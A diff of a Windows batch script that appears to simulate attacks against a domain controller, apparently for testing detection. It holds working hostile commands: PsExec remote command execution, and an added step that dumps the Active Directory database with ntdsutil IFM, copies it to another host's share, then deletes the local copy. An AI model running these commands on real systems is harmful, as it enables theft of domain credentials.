@@ -103,13 +103,22 @@ exit
 TIMEOUT /T 120
 
 rem **Remote code execution attempts (PUT YOUR DOMAIN CONTROLLER HERE)
-PSExec.exe -accepteula -s -d \\dc1.corp.contoso.com cmd.exe
+PSExec.exe -accepteula \\dc1.corp.contoso.com cmd.exe
 TIMEOUT /T 3
 exit
 TIMEOUT /T 120
 
-rem **Data exfiltration over SMB (PUT YOUR DOMAIN CONTROLLER HERE)
-PSExec.exe -accepteula -s -d \\dc1.corp.contoso.com esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit
+rem **Data exfiltration over SMB (PUT YOUR DOMAIN CONTROLLER HERE and the name of a directory on your local machine to copy files to)
+PSExec.exe -accepteula \\dc1.corp.contoso.com  cmd.exe
+TIMEOUT /T 3
+NTSDUTIL "Activate Instance NTDS" "IFM" "Create Full c:\windows\mdi" "q" "q"
+TIMEOUT /T 3
+copy "c:\windows\mdi\Active Directory" \\aftest2\test
+TIMEOUT /T 3
+rmdir /s /q "c:\windows\mdi"
+TIMEOUT /T 3
+exit
+#esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit
 TIMEOUT /T 120
 
 rem ** Cleanup ** (PUT YOUR DOMAIN CONTROLLER HERE)
